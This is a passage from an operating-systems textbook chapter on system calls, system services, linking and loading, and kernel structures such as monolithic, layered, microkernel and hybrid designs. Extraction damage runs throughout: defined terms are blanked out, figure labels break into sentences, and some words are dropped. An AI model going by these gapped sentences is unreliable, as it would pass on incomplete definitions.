Having created new processes, we may need to wait for them to finish their execution. We may want to wait for a certain amount of time to pass (wait time()). More probably, we will want to wait for a specific event to occur (wait event()). The processes should then signal when that event has occurred (signal event()).
Quite often, two or more processes may share data. To ensure the integrity of the data being shared, operating systems often provide system calls allowing
standard C library write( )
write( ) system call
                                         free memory
boot loader free memory
user program (sketch) boot loader
(a) (b)
Figure 2.9 Arduino execution. (a) At system startup. (b) Running a sketch.
a process to      shared data. Then, no other process can access the data until the lock is released. Typically, such system calls include acquire lock() and release lock(). System calls of these types, dealing with the coordination of concurrent processes, are discussed in great detail in Chapter 6 and Chapter 7.
There are so many facets of and variations in process control that we next use two examples—one involving a single-tasking system and the other a multitasking system—to clarify these concepts. The Arduino is a simple hardware platform consisting of a microcontroller along with input sensors that respond to a variety of events, such as changes to light, temperature, and barometric pressure, to just name a few. To write a program for the Arduino, we first write the program on a PC and then upload the compiled program (known as a       ) from the PC to the Arduino’s flash memory via a USB connection. The standard Arduino platform does not provide an operating system; instead, a small piece of software known as a             loads the sketch into a specific region in the Arduino’s memory (Figure 2.9). Once the sketch has been loaded, it begins running, waiting for the events that it is programmed to respond to. example, if the Arduino’s temperature sensor detects that the temperature has exceeded a certain threshold, the sketch may have the Arduino start the motor for a fan. An Arduino is considered a single-tasking system, as only one sketch can be present in memory at a time; if another sketch is loaded, it replaces the existing sketch. Furthermore, the Arduino provides no user interface beyond hardware input sensors.
FreeBSD (derived from Berkeley UNIX) is an example of a multitasking system. When a user logs on to the system, the shell of the user’s choice is run, awaiting commands and running programs the user requests. However, since FreeBSD is a multitasking system, the command interpreter may continue running while another program is executed (Figure 2.10). To start a new pro- cess, the shell executes a fork() system call. Then, the selected program is loaded into memory via an exec() system call, and the program is executed. Depending on how the command was issued, the shell then either waits for the process to finish or runs the process “in the background.” In the latter case, the shell immediately waits for another command to be entered. When a process is running in the background, it cannot receive input directly from the keyboard, because the shell is using this resource. I/O is therefore done through files or through a GUI interface. Meanwhile, the user is free to ask the shell to run other programs, to monitor the progress of the running process, to change that program’s priority, and so on. When the process is done, it executes an exit()
high memory
low memory
Figure 2.10 FreeBSD running multiple programs.
system call to terminate, returning to the invoking process a status code of 0 or a nonzero error code. This status or error code is then available to the shell or other programs. Processes are discussed in
Chapter 3 with a program example using the fork() and exec() system calls.
                       
The file system is discussed in more detail in Chapter 13 through Chapter 15. Here, we identify several common system calls dealing with files.
We first need to be able to create() and delete() files. Either system call requires the name of the file and perhaps some of the file’s attributes. Once the file is created, we need to open() it and to use it. We may also read(), write(), or reposition() (rewind or skip to the end of the file, example). Finally, we need to close() the file, indicating that we are no longer using it.
We may need these same sets of operations for directories if we have a directory structure for organizing files in the file system. In addition, for either files or directories, we need to be able to determine the values of various attributes and perhaps to set them if necessary. File attributes include the file name, file type, protection codes, accounting information, and so on. At least two system calls, get file attributes() and set file attributes(), are required for this function. Some operating systems provide many more calls, such as calls for file move() and copy(). Others might provide an API that performs those operations using code and other system calls, and others might provide system programs to perform the tasks. If the system programs are callable by other programs, then each can be considered an API by other system programs.
                         
A process may need several resources to execute — main memory, disk drives, access to files, and so on. If the resources are available, they can be granted, and control can be returned to the user process. Otherwise, the process will have to wait until sufficient resources are available.
                   
kernel
free memory process C interpreter process B process D
                                        
The various resources controlled by the operating system can be thought of as devices. Some of these devices are physical devices (example, disk drives), while others can be thought of as abstract or virtual devices (example, files). A system with multiple users may require us to first request() a device, to ensure exclusive use of it. After we are finished with the device, we release() it. These functions are similar to the open() and close() system calls for files. Other operating systems allow unmanaged access to devices. The hazard then is the potential for device contention and perhaps deadlock, which are described in Chapter 8.
Once the device has been requested (and allocated to us), we can read(), write(), and (possibly) reposition() the device, just as we can with files. In fact, the similarity between I/O devices and files is so great that many operating systems, including UNIX, merge the two into a combined file – device structure. In this case, a set of system calls is used on both files and devices. Sometimes, I/O devices are identified by special file names, directory placement, or file attributes.
The user interface can also make files and devices appear to be similar, even though the underlying system calls are dissimilar. This is another example of the many design decisions that go into building an operating system and user interface.                                
Many system calls exist simply for the purpose of transferring information between the user program and the operating system. example, most sys- tems have a system call to return the current time() and date(). Other system calls may return information about the system, such as the version number of the operating system, the amount of free memory or disk space, and so on.
Another set of system calls is helpful in debugging a program. Many systems provide system calls to dump() memory. This provision is useful for debugging. The program strace, which is available on Linux systems, lists each system call as it is executed. Even microprocessors provide a CPU mode, known as            , in which a trap is executed by the CPU after every instruction. The trap is usually caught by a debugger.
Many operating systems provide a time profile of a program to indicate the amount of time that the program executes at a particular location or set of locations. A time profile requires either a tracing facility or regular timer interrupts. At every occurrence of the timer interrupt, the value of the program counter is recorded. With sufficiently frequent timer interrupts, a statistical picture of the time spent on various parts of the program can be obtained.
In addition, the operating system keeps information about all its processes, and system calls are used to access this information. Generally, calls are also used to get and set the process information (get process attributes() and set process attributes()). In Section 3.1.3, we discuss what information is normally kept.
                     
There are two common models of interprocess communication: the message- passing model and the shared-memory model. In the                      , the communicating processes exchange messages with one another to trans-
                   
fer information. Messages can be exchanged between the processes either directly or indirectly through a common mailbox. Before communication can take place, a connection must be opened. The name of the other communica- tor must be known, be it another process on the same system or a process on another computer connected by a communications network. Each computer in a network has a           by which it is commonly known. A host also has a network identifier, such as an IP address. Similarly, each process has a             , and this name is translated into an identifier by which the operating system can refer to the process. The get hostid() and get processid() system calls do this translation. The identifiers are then passed to the general- purpose open() and close() calls provided by the file system or to specific open connection() and close connection() system calls, depending on the system’s model of communication. The recipient process usually must give its permission for communication to take place with an accept connection() call. Most processes that will be receiving connections are special-purpose          , which are system programs provided for that purpose. They execute a wait for connection() call and are awakened when a connection is made. The source of the communication, known as the       , and the receiving dae- mon, known as a       , then exchange messages by using read message() and write message() system calls. The close connection() call terminates the communication.
In the                    , processes use shared memory create() and shared memory attach() system calls to create and gain access to regions of memory owned by other processes. Recall that, normally, the operating system tries to prevent one process from accessing another process’s memory. Shared memory requires that two or more processes agree to remove this restriction. They can then exchange information by reading and writing data in the shared areas. The form of the data is determined by the processes and is not under the operating system’s control. The processes are also responsible for ensuring that they are not writing to the same location simultaneously. Such mechanisms are discussed in Chapter 6. In Chapter 4, we look at a variation of the process scheme —threads—in which some memory is shared by default.
Both of the models just discussed are common in operating systems, and most systems implement both. Message passing is useful for exchanging smaller amounts of data, because no conflicts need be avoided. It is also eas- ier to implement than is shared memory for intercomputer communication. Shared memory allows maximum speed and convenience of communication, since it can be done at memory transfer speeds when it takes place within a computer. Problems exist, however, in the areas of protection and synchroniza- tion between the processes sharing memory.
                  
Protection provides a mechanism for controlling access to the resources pro- vided by a computer system. Historically, protection was a concern only on multiprogrammed computer systems with several users. However, with the advent of networking and the Internet, all computer systems, from servers to mobile handheld devices, must be concerned with protection.
Typically, system calls providing protection include set permission() and get permission(), which manipulate the permission settings of
                                         resources such as files and disks. The allow user() and deny user() system calls specify whether
particular users can—or cannot—be allowed access to certain resources. We cover protection in Chapter 17 and the much larger issue of security—which involves using protection against external threats— in Chapter 16.
2.4 System Services
Another aspect of a modern system is its collection of system services. Recall Figure 1.1, which depicted the logical computer hierarchy. At the lowest level is hardware. Next is the operating system, then the system services, and finally the application programs.                , also known as                 , provide a convenient environment for program development and execution. Some of them are simply user interfaces to system calls. Others are consider- ably more complex. They can be divided into these categories:
-               .Theseprogramscreate,delete,copy,rename,print,list, and generally access and manipulate files and directories.
-                   . Some programs simply ask the system for the date, time, amount of available memory or disk space, number of users, or similar status information. Others are more complex, providing detailed performance, logging, and debugging information. Typically, these pro- grams format and print the output to the terminal or other output devices or files or display it in a window of the GUI. Some systems also support a         , which is used to store and retrieve configuration information.
-                 .Severaltexteditorsmaybeavailabletocreateandmod- ify the content of files stored on disk or other storage devices. There may also be special commands to search contents of files or perform transfor- mations of the text.
•
                           .Compilers,assemblers,debuggers, and interpreters for common programming languages (such as C, C++, Java, and Python) are often provided with the operating system or available as a separate download.
-                              . Once a program is assembled or com- piled, it must be loaded into memory to be executed. The system may provide absolute loaders, relocatable loaders, linkage editors, and overlay loaders. Debugging systems for either higher-level languages or machine language are needed as well.
-               . These programs provide the mechanism for creating virtual connections among processes, users, and computer systems. They allow users to send messages to one
another’s screens, to browse web pages, to send e-mail messages, to log in remotely, or to transfer files from one machine to another.
-                    . All general-purpose systems have methods for launching certain system-program processes at boot time. Some of these processes terminate after completing their tasks, while others continue to
                          
run until the system is halted. Constantly running system-program pro- cesses are known as         ,           , or daemons. One example is the network daemon discussed in Section 2.3.3.5. In that example, a sys- tem needed a service to listen for network connections in order to connect those requests to the correct processes. Other examples include process schedulers that start processes according to a specified schedule, system error monitoring services, and print servers. Typical systems have dozens of daemons. In addition, operating systems that run important activities in user context rather than in kernel context may use daemons to run these activities.
Along with system programs, most operating systems are supplied with programs that are useful in solving common problems or performing common operations. Such                      include web browsers, word proces- sors and text formatters, spreadsheets, database systems, compilers, plotting and statistical-analysis packages, and games.
The view of the operating system seen by most users is defined by the application and system programs, rather than by the actual system calls. Con- sider a user’s PC. When a user’s computer is running the macOS operating system, the user might see the GUI, featuring a mouse-and-windows interface. Alternatively, or even in one of the windows, the user might have a command- line UNIX shell. Both use the same set of system calls, but the system calls look different and act in different ways. Further confusing the user view, consider the user dual-booting from macOS into Windows. Now the same user on the same hardware has two entirely different interfaces and two sets of applica- tions using the same physical resources. On the same hardware, then, a user can be exposed to multiple user interfaces sequentially or concurrently.
2.5 Linkers and Loaders
Usually, a program resides on disk as a binary executable file—example, a.out or prog.exe. To run on a CPU, the program must be brought into mem- ory and placed in the context of a process. In this section, we describe the steps in this procedure, from compiling a program to placing it in memory, where it becomes eligible to run on an available CPU core. The steps are highlighted in Figure 2.11.
Source files are compiled into object files that are designed to be loaded into any physical memory location, a format known as an                        . Next, the        combines these relocatable object files into a single binary            file. During the linking phase, other object files or libraries may be included as well, such as the standard C or math library (specified with the flag -lm).
A        is used to load the binary executable file into memory, where it is eligible to run on a CPU core. An activity associated with linking and loading is           , which assigns final addresses to the program parts and adjusts code and data in the program to match those addresses so that, example, the code can call library functions and access its variables as it executes. In Figure 2.11, we see that to run the loader, all that is necessary is to enter the name of the executable file on the command line. When a program name is entered on the
            
                           
other object files dynamically linked libraries source program
compiler
object file
linker
main.c
gcc -c main.c generates
main.o
gcc -o main main.o -lm generates
./main
executable main file loader
program in memory
Figure 2.11 The role of the linker and loader.
command line on UNIX systems—example, ./main—the shell first creates a new process to run the program using the fork() system call. The shell then invokes the loader with the exec() system call, passing exec() the name of the executable file. The loader then loads the specified program into memory using the address space of the newly created process. (When a GUI interface is used, double-clicking on the icon associated with the executable file invokes the loader using a similar mechanism.)
The process described thus far assumes that all libraries are linked into the executable file and loaded into memory. In reality, most systems allow a program to dynamically link libraries as the program is loaded. Windows, for instance, supports dynamically linked libraries (    ). The benefit of this approach is that it avoids linking and loading libraries that may end up not being used into an executable file. Instead, the library is conditionally linked and is loaded if it is required during program run time. example, in Figure 2.11, the math library is not linked into the executable file main. Rather, the linker inserts relocation information that allows it to be dynamically linked and loaded as the program is loaded. We shall see in Chapter 9 that it is possible for multiple processes to share dynamically linked libraries, resulting in a significant savings in memory use.
Object files and executable files typically have standard formats that include the compiled machine code and a symbol table containing metadata about functions and variables that are referenced in the program. For UNIX and Linux systems, this standard format is known as ELF (for                               ). There are separate ELF formats for relocatable and
                                                     ELF FORMAT
Linux provides various commands to identify and evaluate ELF files. example, the file command determines a file type. If main.o is an object file, and main is an executable file, the command
file main.o
will report that main.o is an ELF relocatable file, while the command
file main
will report that main is an ELF executable. ELF files are divided into a number
of sections and can be evaluated using the readelf command.
executable files. One piece of information in the ELF file for executable files is the program’s entry point, which contains the address of the first instruction to be executed when the program runs. Windows systems use the                     (PE) format, and macOS uses the        format.
2.6 Why Applications Are Operating-System Specific
Fundamentally, applications compiled on one operating system are not exe- cutable on other operating systems. If they were, the world would be a better place, and our choice of what operating system to use would depend on utility and features rather than which applications were available.
Based on our earlier discussion, we can now see part of the problem — each operating system provides a unique set of system calls. System calls are part of the set of services provided by operating systems for use by applications. Even if system calls were somehow uniform, other barriers would make it difficult for us to execute application programs on different operating systems. But if you have used multiple operating systems, you may have used some of the same applications on them. How is that possible? An application can be made available to run on multiple operating systems in one of three ways:
   The application can be written in an interpreted language (such as Python or Ruby) that has an interpreter available for multiple operating systems. The interpreter reads each line of the source program, executes equivalent instructions on the native instruction set, and calls native operating sys- tem calls. Performance suffers relative to that for native applications, and the interpreter provides only a subset of each operating system’s features, possibly limiting the feature sets of the associated applications.
   The application can be written in a language that includes a virtual machine containing the running application. The virtual machine is part of the language’s full RTE. One example of this method is Java. Java has an RTE that includes a loader, byte-code verifier, and other components that load the Java application into the Java virtual machine. This RTE has been
                                               , or developed, for many operating systems, from mainframes to smartphones, and in theory any Java app can run within the RTE wherever it is available. Systems of this kind have disadvantages similar to those of interpreters, discussed above.
   The application developer can use a standard language or API in which the compiler generates binaries in a machine- and operating-system- specific language. The application must be ported to each operating sys- tem on which it will run. This porting can be quite time consuming and must be done for each new version of the application, with subsequent testing and debugging. Perhaps the best-known example is the POSIX API and its set of standards for maintaining source-code compatibility between different variants of UNIX-like operating systems.
In theory, these three approaches seemingly provide simple solutions for developing applications that can run across different operating systems. How- ever, the general lack of application mobility has several causes, all of which still make developing cross-platform applications a challenging task. At the application level, the libraries provided with the operating system contain APIs to provide features like GUI interfaces, and an application designed to call one set of APIs (say, those available from iOS on the Apple iPhone) will not work on an operating system that does not provide those APIs (such as Android). Other challenges exist at lower levels in the system, including the following.
- Each operating system has a binary format for applications that dictates the layout of the header, instructions, and variables. Those components need to be at certain locations in specified structures
within an executable file so the operating system can open the file and load the application for proper execution.
- CPUs have varying instruction sets, and only applications containing the appropriate instructions can execute correctly.
- Operatingsystemsprovidesystemcallsthatallowapplicationstorequest various activities, such as creating files and opening network connec- tions. Those system calls vary among operating systems in many
respects, including the specific operands and operand ordering used, how an appli- cation invokes the system calls, their numbering and number, their mean- ings, and their return of results.
There are some approaches that have helped address, though not com- pletely solve, these architectural differences. example, Linux—and almost every UNIX system—has adopted the ELF format for binary executable files. Although ELF provides a common standard across Linux and UNIX systems, the ELF format is not tied to any specific computer architecture, so it does not guarantee that an executable file will run across different hardware platforms.
APIs, as mentioned above, specify certain functions at the application level. At the architecture level, an                              (ABI) is used to define how different components of binary code can interface for a given operating system on a given architecture. An ABI specifies low-level details, including address width, methods of passing parameters to system calls, the organization
                                                 
of the run-time stack, the binary format of system libraries, and the size of data types, just to name a few. Typically, an ABI is specified for a given architecture (example, there is an ABI for the ARMv8 processor). Thus, an ABI is the architecture-level equivalent of an API. If a binary executable file has been compiled and linked according to a particular ABI, it should be able to run on different systems that support that ABI. However, because a particular ABI is defined for a certain operating system running on a given architecture, ABIs do little to provide cross-platform compatibility.
In sum, all of these differences mean that unless an interpreter, RTE, or binary executable file is written for and compiled on a specific operating system on a specific CPU type (such as Intel x86 or ARMv8), the application will fail to run. Imagine the amount of work that is required for a program such as the Firefox browser to run on Windows, macOS, various Linux releases, iOS, and Android, sometimes on various CPU architectures.
2.7 Operating-System Design and Implementation
In this section, we discuss problems we face in designing and implementing an operating system. There are, of course, no complete solutions to such problems, but there are approaches that have proved successful.
2.7.1 Design Goals
The first problem in designing a system is to define goals and specifications. At the highest level, the design of the system will be affected by the choice of hard- ware and the type of system: traditional desktop/laptop, mobile, distributed, or real time.
Beyond this highest design level, the requirements may be much harder to specify. The requirements can, however, be divided into two basic groups:            and             . Users want certain obvious properties in a system. The system should be convenient to use, easy to learn and to use, reliable, safe, and fast. Of course, these specifications are not particularly useful in the system design, since there is no general agreement on how to achieve them.
A similar set of requirements can be defined by the developers who must design, create, maintain, and operate the system. The system should be easy to design, implement, and maintain; and it should be flexible, reliable, error free, and efficient. Again, these requirements are vague and may be interpreted in various ways. There is, in short, no unique solution to the problem of defining the require- ments for an operating system. The wide range of systems in existence shows that different requirements can result in a large variety of solutions for different environments. example, the requirements for Wind River VxWorks, a real- time operating system for embedded systems, must have been substantially different from those for Windows Server, a large multiaccess operating system designed for enterprise applications.
Specifying and designing an operating system is a highly creative task. Although no textbook can tell you how to do it, general principles have been
                                         developed in the field of                     , and we turn now to a discus- sion of some of these principles.
2.7.2 Mechanisms and Policies
One important principle is the separation of        from          . Mecha- nisms determine how to do something; policies determine what will be done. example, the timer construct (see Section 1.4.3) is a mechanism for ensuring CPU protection, but deciding how long the timer is to be set for a particular user is a policy decision.
The separation of policy and mechanism is important for flexibility. Policies are likely to change across places or over time. In the worst case, each change in policy would require a change in the underlying mechanism. A general mechanism flexible enough to work across a range of policies is preferable. A change in policy would then require redefinition of only certain parameters of the system. For instance, consider a mechanism for giving priority to certain types of programs over others. If the mechanism is properly separated from policy, it can be used either to support a policy decision that I/O-intensive programs should have priority over CPU-intensive ones or to support the opposite policy. Microkernel-based operating systems (discussed in Section 2.8.3) take the separation of mechanism and policy to one extreme by implementing a basic set of primitive building blocks. These blocks are almost policy free, allowing more advanced mechanisms and policies to be added via user-created kernel modules or user programs themselves. In contrast, consider Windows, an enormously popular commercial operating system available for over three decades. Microsoft has closely encoded both mechanism and policy into the system to enforce a global look and feel across all devices that run the Windows operating system. All applications have similar interfaces, because the interface itself is built into the kernel and system libraries. Apple has adopted a similar strategy with its macOS and iOS operating systems.
We can make a similar comparison between commercial and open-source operating systems. For instance, contrast Windows, discussed above, with Linux, an open-source operating system that runs on a wide range of computing devices and has been available for over 25 years. The “standard” Linux kernel has a specific CPU scheduling algorithm (covered in Section 5.7.1), which is a mechanism that supports a certain policy. However, anyone is free to modify or replace the scheduler to support a different policy.
Policy decisions are important for all resource allocation. Whenever it is necessary to decide whether or not to allocate a resource, a policy decision must be made. Whenever the question is how rather than what, it is a mechanism that must be determined.
2.7.3 Implementation
Once an operating system is designed, it must be implemented. Because oper- ating systems are collections of many programs, written by many people over a long period of time, it is difficult to make general statements about how they are implemented.
Early operating systems were written in assembly language. Now, most are written in higher-level languages such as C or C++, with small amounts
                                 
of the system written in assembly language. In fact, more than one higher- level language is often used. The lowest levels of the kernel might be written in assembly language and C. Higher-level routines might be written in C and C++, and system libraries might be written in C++ or even higher-level lan- guages. Android provides a nice example: its kernel is written mostly in C with some assembly language. Most Android system libraries are written in C or C++, and its application frameworks—which provide the developer interface to the system—are written mostly in Java. We cover Android’s architecture in more detail in Section 2.8.5.2.
The advantages of using a higher-level language, or at least a systems- implementation language, for implementing operating systems are the same as those gained when the language is used for application programs: the code can be written faster, is more compact, and is easier to understand and debug. In addition, improvements in compiler technology will improve the gener- ated code for the entire operating system by simple recompilation. Finally, an operating system is far easier to port to other hardware if it is written in a higher-level language. This is particularly important for operating systems that are intended to run on several different hardware systems, such as small embedded devices, Intel x86 systems, and ARM chips running on phones and tablets.
The only possible disadvantages of implementing an operating system in a higher-level language are reduced speed and increased storage requirements. This, however, is not a major issue in today’s systems. Although an expert assembly-language programmer can produce efficient small routines, for large programs a modern compiler can perform complex analysis and apply sophis- ticated optimizations that produce excellent code. Modern processors have deep pipelining and multiple functional units that can handle the details of complex dependencies much more easily than can the human mind.
As is true in other systems, major performance improvements in operating systems are more likely to be the result of better data structures and algorithms than of excellent assembly-language code. In addition, although operating sys- tems are large, only a small amount of the code is critical to high performance; the interrupt handlers, I/O manager, memory manager, and CPU scheduler are probably the most critical routines. After the system is written and is working correctly, bottlenecks can be identified and can be refactored to operate more efficiently.
2.8 Operating-System Structure
A system as large and complex as a modern operating system must be engi- neered carefully if it is to function properly and be modified easily. A common approach is to partition the task into small components, or modules, rather than have one single system. Each of these modules should be a well- defined portion of the system, with carefully defined interfaces and functions. You may use a similar approach when you structure your programs: rather than placing all of your code in the main() function, you instead separate logic into a num- ber of functions, clearly articulate parameters and return values, and then call those functions from main().
                                        
(the users)
shells and commands compilers and interpreters system libraries
system-call interface to the kernel
signals terminal handling character I/O system terminal drivers
file system swapping block I/O system
disk and tape drivers
CPU scheduling page replacement demand paging virtual memory
kernel interface to the hardware terminal controllers terminals
device controllers disks and tapes memory controllers physical memory
Figure 2.12 Traditional UNIX system structure.
We briefly discussed the common components of operating systems in Chapter 1. In this section, we discuss how these components are interconnected and melded into a kernel.
2.8.1 Monolithic Structure
The simplest structure for organizing an operating system is no structure at all. That is, place all of the functionality of the kernel into a single, static binary file that runs in a single address space. This approach —known as a            structure—is a common technique for designing operating systems.
An example of such limited structuring is the original UNIX operating system, which consists of two separable parts: the kernel and the system programs. The kernel is further separated into a series of interfaces and device drivers, which have been added and expanded over the years as UNIX has evolved. We can view the traditional UNIX operating system as being layered to some extent, as shown in Figure 2.12. Everything below the system-call interface and above the physical hardware is the kernel. The kernel provides the file system, CPU scheduling, memory management, and other operating- system functions through system calls. Taken in sum, that is an enormous amount of functionality to be combined into one single address space.
The Linux operating system is based on UNIX and is structured similarly, as shown in Figure 2.13. Applications typically use the glibc standard C library when communicating with the system call interface to the kernel. The Linux kernel is monolithic in that it runs entirely in kernel mode in a single address space, but as we shall see in Section 2.8.4, it does have a modular design that allows the kernel to be modified during run time.
Despite the apparent simplicity of monolithic kernels, they are difficult to implement and extend. Monolithic kernels do have a distinct performance advantage, however: there is very little overhead in the system-call interface, and communication within the kernel is fast. Therefore, despite the drawbacks kernel
                                 
applications system-call interface
file systems
CPU scheduler networks ( TCP/IP) memory manager block devices character devices device drivers
hardware
Figure 2.13 Linux system structure.
of monolithic kernels, their speed and efficiency explains why we still see
evidence of this structure in the UNIX, Linux, and Windows operating systems.
2.8.2 Layered Approach
The monolithic approach is often known as a                 system because changes to one part of the system can have wide-ranging effects on other parts. Alternatively, we could design a                 system. Such a system is divided into separate, smaller components that have specific and limited func- tionality. All these components together comprise the kernel. The advantage of this modular approach is that changes in one component affect only that component, and no others, allowing system implementers more freedom in creating and changing the inner workings of the system.
A system can be made modular in many ways. One method is the                 , in which the operating system is broken into a number of layers (levels). The bottom layer (layer 0) is the hardware; the highest (layer N) is the user interface. This layering structure is depicted in Figure 2.14.
An operating-system layer is an implementation of an abstract object made up of data and the operations that can manipulate those data. A typical operating-system layer—say, layer M—consists of data structures and a set of functions that can be invoked by higher-level layers. Layer M, in turn, can invoke operations on lower-level layers.
The main advantage of the layered approach is simplicity of construction and debugging. The layers are selected so that each uses functions (operations)
glibc standard c library
            
                           
Figure 2.14
layer N user interface
•
layer 1
layer 0 hardware
A layered operating system.
and services of only lower-level layers. This approach simplifies debugging and system verification. The first layer can be debugged without any concern for the rest of the system, because, by definition, it uses only the basic hardware (which is assumed correct) to implement its functions. Once the first layer is debugged, its correct functioning can be assumed while the second layer is debugged, and so on. If an error is found during the debugging of a particular layer, the error must be on that layer, because the layers below it are already debugged. Thus, the design and implementation of the system are simplified. Each layer is implemented only with operations provided by lower-level layers. A layer does not need to know how these operations are implemented; it needs to know only what these operations do. Hence, each layer hides the existence of certain data structures, operations, and hardware from higher- level layers.
Layered systems have been successfully used in computer networks (such as TCP/IP) and web applications. Nevertheless, relatively few operating sys- tems use a pure layered approach. One reason involves the challenges of appropriately defining the functionality of each layer. In addition, the overall performance of such systems is poor due to the overhead of requiring a user program to traverse through multiple layers to obtain an operating-system ser- vice. Some layering is common in contemporary operating systems, however. Generally, these systems have fewer layers with more functionality, providing most of the advantages of modularized code while avoiding the problems of layer definition and interaction.
2.8.3 Microkernels
We have already seen that the original UNIX system had a monolithic struc- ture. As UNIX expanded, the kernel became large and difficult to manage. In the mid-1980s, researchers at Carnegie Mellon University developed an operating system called      that modularized the kernel using the               approach. This method structures the operating system by removing
                                 
application program
file system
device driver
interprocess communication Figure 2.15 Architecture of a typical microkernel.
all nonessential components from the kernel and implementing them as user- level programs that reside in separate address spaces. The result is a smaller kernel. There is little consensus regarding which services should remain in the kernel and which should be implemented in user space. Typically, however, microkernels provide minimal process and memory management, in addition to a communication facility. Figure 2.15 illustrates the architecture of a typical microkernel.
The main function of the microkernel is to provide communication between the client program and the various services that are also running in user space. Communication is provided through message passing, which was described in Section 2.3.3.5. example, if the client program wishes to access a file, it must interact with the file server. The client program and service never interact directly. Rather, they communicate indirectly by exchanging messages with the microkernel.
One benefit of the microkernel approach is that it makes extending the operating system easier. All new services are added to user space and conse- quently do not require modification of the kernel. When the kernel does have to be modified, the changes tend to be fewer, because the microkernel is a smaller kernel. The resulting operating system is easier to port from one hardware design to another. The microkernel also provides more security and reliability, since most services are running as user—rather than kernel—processes. If a service fails, the rest of the operating system remains untouched.
Perhaps the best-known illustration of a microkernel operating system is Darwin, the kernel component of the macOS and iOS operating systems. Darwin, in fact, consists of two kernels, one of which is the Mach microkernel. We will cover the macOS and iOS systems in further detail in Section 2.8.5.1.
Another example is QNX, a real-time operating system for embedded sys- tems. The QNX Neutrino microkernel provides services for message passing and process scheduling. It also handles low-level network communication and hardware interrupts. All other services in QNX are provided by standard pro- cesses that run outside the kernel in user mode.
Unfortunately, the performance of microkernels can suffer due to increased system-function overhead. When two user-level services must communicate, messages must be copied between the services, which reside in separate
                                        
address spaces. In addition, the operating system may have to switch from one process to the next to exchange the messages. The overhead involved in copying messages and switching between processes has been the largest impediment to the growth of microkernel-based operating systems. Consider the history of Windows NT: The first release had a layered microkernel organi- zation. This version’s performance was low compared with that of Windows 95. Windows NT 4.0 partially corrected the performance problem by moving layers from user space to kernel space and integrating them more closely. By the time Windows XP was designed, Windows architecture had become more monolithic than microkernel. Section 2.8.5.1 will describe how macOS addresses the performance issues of the Mach microkernel. 2.8.4 Modules
Perhaps the best current methodology for operating-system design involves using                         (    ). Here, the kernel has a set of core components and can link in additional services via modules, either at boot time or during run time. This type of design is common in modern implementations of UNIX, such as Linux, macOS, and Solaris, as well as Windows. The idea of the design is for the kernel to provide core services, while other services are implemented dynamically, as the kernel is running. Linking services dynamically is preferable to adding new features directly to the kernel, which would require recompiling the kernel every time a change was made. Thus, example, we might build CPU scheduling and memory management algorithms directly into the kernel and then add support for different file systems by way of loadable modules.
The overall result resembles a layered system in that each kernel section has defined, protected interfaces; but it is more flexible than a layered system, because any module can call any other module. The approach is also similar to the microkernel approach in that the primary module has only core functions and knowledge of how to load and communicate with other modules; but it is more efficient, because modules do not need to invoke message passing in order to communicate.
Linux uses loadable kernel modules, primarily for supporting device drivers and file systems. LKMs can be “inserted” into the kernel as the sys- tem is started (or booted) or during run time, such as when a USB device is plugged into a running machine. If the Linux kernel does not have the nec- essary driver, it can be dynamically loaded. LKMs can be removed from the kernel during run time as well. For Linux, LKMs allow a dynamic and modular kernel, while maintaining the performance benefits of a monolithic system. We cover creating LKMs in Linux in several programming exercises at the end of this chapter.
2.8.5 Hybrid Systems
In practice, very few operating systems adopt a single, strictly defined struc- ture. Instead, they combine different structures, resulting in hybrid systems that address performance, security, and usability issues. example, Linux is monolithic, because having the operating system in a single address space provides very efficient performance. However, it also modular, so that new functionality can be dynamically added to the kernel. Windows is largely
                                 
monolithic as well (again primarily for performance reasons), but it retains some behavior typical of microkernel systems, including providing support for separate subsystems (known as operating-system personalities) that run as user-mode processes. Windows systems also provide support for dynamically loadable kernel modules. We provide case studies of Linux and Windows 10 in Chapter 20 and Chapter 21, respectively. In the remainder of this section, we explore the structure of three hybrid systems: the Apple macOS operat- ing system and the two most prominent mobile operating systems—iOS and Android.
                     
Apple’s macOS operating system is designed to run primarily on desktop and laptop computer systems, whereas iOS is a mobile operating system designed for the iPhone smartphone and iPad tablet computer. Architecturally, macOS and iOS have much in common, and so we present them together, highlighting what they share as well as how they differ from each other. The general archi- tecture of these two systems is shown in Figure 2.16. Highlights of the various layers include the following:
-                    .Thislayerdefinesthesoftwareinterfacethatallows users to interact with the computing devices. macOS uses the Aqua user interface, which is designed for a mouse or trackpad, whereas iOS uses the Springboard user interface, which is designed for touch devices.
-                             . This layer includes the Cocoa and Cocoa Touch frameworks, which provide an API for the Objective-C and Swift programming languages. The primary difference between Cocoa and Cocoa Touch is that the former is used for developing macOS applications, and the latter by iOS to provide support for hardware features unique to mobile devices, such as touch screens.
-                . This layer defines frameworks that support graphics and media
including, Quicktime and OpenGL.
user experience
Figure 2.16 Architecture of Apple’s macOS and iOS operating systems.
applications
application frameworks core frameworks
kernel environment (Darwin)
                                        
-                   . This environment, also known as       ,
includes the Mach microkernel and the BSD UNIX kernel. We will elaborate on Darwin shortly.
As shown in Figure 2.16, applications can be designed to take advantage of user-experience features or to bypass them and interact directly with either the application framework or the core framework. Additionally, an application can forego frameworks entirely and communicate directly with the kernel environment. (An example of this latter situation is a C program written with no user interface that makes POSIX system calls.)
Some significant distinctions between macOS and iOS include the follow- ing:
- BecausemacOSisintendedfordesktopandlaptopcomputersystems,itis compiled to run on Intel architectures. iOS is designed for mobile devices and thus is compiled for ARM-based architectures. Similarly, the iOS ker- nel has been modified somewhat to address specific features and needs of mobile systems, such as power management and aggressive memory management. Additionally, iOS has more stringent security settings than macOS.
- TheiOSoperatingsystemisgenerallymuchmorerestrictedtodevelopers than macOS and may even be closed to developers. example, iOS restricts access to POSIX and BSD APIs on iOS, whereas they are openly available to developers on macOS.
We now focus on Darwin, which uses a hybrid structure. Darwin is a layered system that consists primarily of the Mach microkernel and the BSD UNIX kernel. Darwin’s structure is shown in Figure 2.17. Whereas most operating systems provide a single system-call interface to the kernel — such as through the standard C library on UNIX and Linux systems —Darwin provides two system-call interfaces: Mach system calls (known as
applications library interface
Mach traps
BSD (POSIX) system calls
memory management IPC
iokit
kexts scheduling Mach kernel
Figure 2.17 The structure of Darwin.
                                 
     ) and BSD system calls (which provide POSIX functionality). The interface to these system calls is a rich set of libraries that includes not only the standard C library but also libraries that provide networking, security, and progamming language support (to name just a few).
